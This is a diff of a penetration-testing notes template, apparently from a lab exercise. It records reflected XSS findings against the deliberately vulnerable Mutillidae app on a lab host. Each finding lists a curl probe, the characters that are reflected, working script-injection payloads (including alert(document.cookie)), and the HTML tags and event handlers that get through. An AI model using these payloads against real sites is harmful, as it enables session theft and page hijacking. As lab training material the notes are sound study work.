@@ -281,79 +281,131 @@ Command conventions, placeholders and output file naming are in [🧭 phase-walk
 
 ### 2. Findings
 
-*Use one block per confirmed vulnerability.*
+*Divide in two blocks: gathering and finding. Gathering should be quick and straightforward. Finding should be concise and contain the successful payload. Think about merging both*
 
 #### `WSTG-INPV-01` · `Reflected XSS`
 
 - **Related questions:** `Qxx`
 - **URL / parameter:** `curl -sk "http://meta2/mutillidae?page=zzXSS9f2a" | grep -c "zzXSS9f2a"`
-- **Type and technique:** `Method GET XSS reflected`
-- **Evidence:** `recon/<file>` (line `<n>`), or screenshot
-- **Flag / value:** `1 occurrence`
-- **Impact:** `<one line>`
+- **Type and technique:** `GET XSS reflected`
+- **Evidence:** `All chars accepted`
+- **Flag / value:** ```page=zzXSS9f2a'\"<>\`\\\${{7*7}}```
+- **Impact:** `HTML injection with <script>`
+- **Target**: `HTML href attribute`
+- **Payload**: `page?="></a><script>alert(1);</script>`
 
 #### `WSTG-INPV-01` · `Reflected XSS`
 
 - **Related questions:** `Qxx`
 - **URL / parameter:** `curl -sk -X POST -d "target_host=zzXSS9f2a&dns-lookup-php-submit-button=zzXSS9f2a" -H "application/x-www-form-urlencoded" "http://meta2/mutillidae/index.php?page=dns-lookup.php" | grep -c "zzXSS9f2a"`
-- **Type and technique:** `Method POST XSS reflected`
-- **Evidence:** `recon/<file>` (line `<n>`), or screenshot
-- **Flag / value:** `2 occurrences`
-- **Impact:** `<one line>`
+- **Type and technique:** `POST XSS reflected`
+- **Evidence:** all chars - pseudo chars
+- **Flag / value:**
+    - ```zzXSS9f2a'"<>`\${{7*7}}```
+    - ```zzXSS9f2a'&quot;&lt;&gt;`\${{7*7}}```
+- **Impact:** `HTML injection with <script>`
+- **Target**: `HTML body`
+- **Payload**: `page?=</p><script>alert(document.domain)</script>`
+- **Tags allowed**: `script img svg body input iframe details math marquee`
+- **Attributes allowed**: `onerror onload onfocus onmouseover onpointerover ontoggle`
 
 #### `WSTG-INPV-01` · `Reflected XSS`
 
 - **Related questions:** `Qxx`
 - **URL / parameter:** `curl -sk -X POST -d "ToolID=zzXSS9f2a&pen-test-tool-lookup-php-submit-button=zzXSS9f2a" -H "application/x-www-form-urlencoded" "http://meta2/mutillidae/index.php?page=pen-test-tool-lookup.php" | grep -c "zzXSS9f2a"" | grep -c "zzXSS9f2a"`
-- **Type and technique:** `Method POST XSS reflected`
-- **Evidence:** `recon/<file>` (line `<n>`), or screenshot
-- **Flag / value:** `1 occurrence`
-- **Impact:** `<one line>`
+- **Type and technique:** `POST XSS reflected`
+- **Evidence:** all chars - pseudo chars
+- **Flag / value:**
+    - ```zzXSS9f2a'"<>`\${{7*7}}```
+    - ```zzXSS9f2a'&quot;&lt;&gt;`\${{7*7}}```
+- **Impact:** `HTML injection with <script> / JS injection`
+- **Target**: `HTML body / JavaScript`
+- **Payloads**: 
+    - Causing error, so HTML is injected in body through JavaScript: `ToolID='''[['</td><script>alert(document.domain)</script>`
+    - Breaking the JSON at JavaScript: `12312321"}});alert(document.domain);--`
+- **Tags allowed**: `script img svg body input iframe details math marquee`
+- **Attributes allowed**: `onerror onload onfocus onmouseover onpointerover ontoggle`
+
 
 #### `WSTG-INPV-01` · `Reflected XSS`
 
 - **Related questions:** `Qxx`
 - **URL / parameter:** `curl -sk -X POST -d "background_color=zzXSS9f2a&set-background-color-php-submit-button=zzXSS9f2a" -H "application/x-www-form-urlencoded" "http://meta2/mutillidae/index.php?page=set-background-color.php" | grep -c "zzXSS9f2a" | grep -c "zzXSS9f2a"`
-- **Type and technique:** `Method POST XSS reflected`
-- **Evidence:** `recon/<file>` (line `<n>`), or screenshot
-- **Flag / value:** `2 occurrence`
-- **Impact:** `<one line>`
+- **Type and technique:** `POST XSS reflected`
+- **Evidence:** all chars - pseudo chars
+- **Flag / value:**
+    - ```zzXSS9f2a'"<>`\${{7*7}}```
+    - ```zzXSS9f2a'&quot;&lt;&gt;`\${{7*7}}```
+- **Impact:** `HTML injection with <script>`
+- **Target**: `HTML body`
+- **Payloads**: 
+    - Close style attribute and proceed with injection: `background_color="><script>alert(document.domain)</script>`
+- **Tags allowed**: `script img svg body input iframe details math marquee`
+- **Attributes allowed**: `onerror onload onfocus onmouseover onpointerover ontoggle`
 
 #### `WSTG-INPV-01` · `Reflected XSS`
 
 - **Related questions:** `Qxx`
 - **URL / parameter:** `curl -sk -X POST -d "textfile=zzXSS9f2a&text-file-viewer-php-submit-button=zzXSS9f2a" -H "application/x-www-form-urlencoded" "http://meta2/mutillidae/index.php?page=text-file-viewer.php" | grep -c "zzXSS9f2a"`
-- **Type and technique:** `Method POST XSS reflected`
-- **Evidence:** `recon/<file>` (line `<n>`), or screenshot
-- **Flag / value:** `2 occurrences`
-- **Impact:** `<one line>`
+- **Type and technique:** `POST XSS reflected`
+- **Evidence:** all chars - pseudo chars
+- **Flag / value:**
+    - ```zzXSS9f2a'"<>`\${{7*7}}```
+    - ```zzXSS9f2a'&quot;&lt;&gt;`\${{7*7}}```
+- **Impact:** `HTML injection with <script>`
+- **Target**: `HTML body`
+- **Payloads**: 
+    - Direct html body injection (full chars): `textfile=</p><script>alert(document.domain)</script>`
+- **Tags allowed**: `script img svg body input iframe details math marquee`
 
 #### `WSTG-INPV-01` · `Reflected XSS`
 
 - **Related questions:** `Qxx`
 - **URL / parameter:** `curl -sk -X POST -d "csrf-token=zzXSS9f2a&blog_entry=zzXSS9f2a&add-to-your-blog-php-submit-button=zzXSS9f2a" -H "application/x-www-form-urlencoded" "http://meta2/mutillidae/index.php?page=add-to-your-blog.php" | grep -c "zzXSS9f2a"`
-- **Type and technique:** `Method POST XSS reflected`
-- **Evidence:** `recon/<file>` (line `<n>`), or screenshot
-- **Flag / value:** `1 occurrence`
-- **Impact:** `<one line>`
+- **Type and technique:** `POST XSS reflected`
+- **Evidence:** all chars - pseudo chars
+- **Flag / value:**
+    - ```zzXSS9f2a'"<>`\${{7*7}}```
+    - ```zzXSS9f2a'&quot;&lt;&gt;`\${{7*7}}```
+- **Impact:** `HTML injection with <script>`
+- **Target**: `HTML body`
+- **Payloads**: 
+    - Direct html body injection (no errors): `</td><script>alert(document.domain)</script>`
+    - Causing error, so HTML is injected in body through JavaScript: `'''[]</td><script>alert(document.domain)</script>`
+- **Tags allowed**: `script img svg body input iframe details math marquee`
+- **Attributes allowed**: `onerror onload onfocus onmouseover onpointerover ontoggle`
 
 #### `WSTG-INPV-01` · `Reflected XSS`
 
 - **Related questions:** `Qxx`
 - **URL / parameter:** `curl -sk -X POST -d "username=zzXSS9f2a&password=zzXSS9f2a&confirm_password=zzXSS9f2a&my_signature=zzXSS9f2a&register-php-submit-button=zzXSS9f2a" -H "application/x-www-form-urlencoded" "http://meta2/mutillidae/index.php?page=register.php" | grep -c "zzXSS9f2a"`
-- **Type and technique:** `Method POST XSS reflected`
-- **Evidence:** `recon/<file>` (line `<n>`), or screenshot
-- **Flag / value:** `1 occurrence`
-- **Impact:** `<one line>`
+- **Type and technique:** `POST XSS reflected`
+- **Evidence:** all chars - pseudo chars
+- **Flag / value:**
+    - ```zzXSS9f2a'"<>`\${{7*7}}```
+    - ```zzXSS9f2a'&quot;&lt;&gt;`\${{7*7}}```
+- **Impact:** `HTML injection with <script>`
+- **Target**: `HTML body`
+- **Payloads**: 
+    - Direct html body injection (no errors): `</h2><script>alert(document.domain)</script>`
+- **Tags allowed**: `script img svg body input iframe details math marquee`
+- **Attributes allowed**: `onerror onload onfocus onmouseover onpointerover ontoggle`
 
 #### `WSTG-INPV-01` · `Reflected XSS`
 
 - **Related questions:** `Qxx`
 - **URL / parameter:** `curl -sk -X POST -d "username=zzXSS9f2a&password=zzXSS9f2a&login-php-submit-button=zzXSS9f2a" -H "application/x-www-form-urlencoded" "http://meta2/mutillidae/index.php?page=login.php" | grep -c "zzXSS9f2a"`
-- **Type and technique:** `Method POST XSS reflected`
-- **Evidence:** `recon/<file>` (line `<n>`), or screenshot
-- **Flag / value:** `3 occurrences`
-- **Impact:** `<one line>`
+- **Type and technique:** `POST XSS reflected`
+- **Evidence:** all chars - pseudo chars
+- **Flag / value:**
+    - ```zzXSS9f2a'"<>`\${{7*7}}```
+    - ```zzXSS9f2a'&quot;&lt;&gt;`\${{7*7}}```
+- **Impact:** `HTML injection with <script>`
+- **Target**: `HTML body`
+- **Payloads**: 
+    - Direct html body injection (no errors): `'''[[</td><script>alert(document.cookie)</script>`
+- **Tags allowed**: `script img svg body input iframe details math marquee`   
+- **Attributes allowed**: `onerror onload onfocus onmouseover onpointerover ontoggle`
 
 #### `<WSTG-ID>` · `<Finding title>`
 
@@ -363,8 +415,6 @@ Command conventions, placeholders and output file naming are in [🧭 phase-walk
 - **Evidence:** `recon/<file>` (line `<n>`), or screenshot
 - **Flag / value:** `<value>`
 - **Impact:** `<one line>`
-
-
 
 ### 3. Next steps
 
